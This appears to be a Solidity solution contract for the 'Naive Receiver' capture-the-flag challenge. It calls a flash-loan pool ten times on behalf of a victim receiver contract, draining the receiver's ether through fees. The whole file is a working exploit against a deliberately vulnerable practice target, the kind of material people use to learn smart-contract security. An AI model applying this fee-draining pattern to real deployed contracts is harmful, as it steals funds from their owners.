// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract AttackNaiveReciever {
    NaiveReceiverLenderPool public pool;
    address public receiver;

    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = _receiver;
    }

    function attack() public {
        for (uint i=0; i < 10; i++) {
            pool.flashLoan(receiver, 1 ether);
        }
    }
}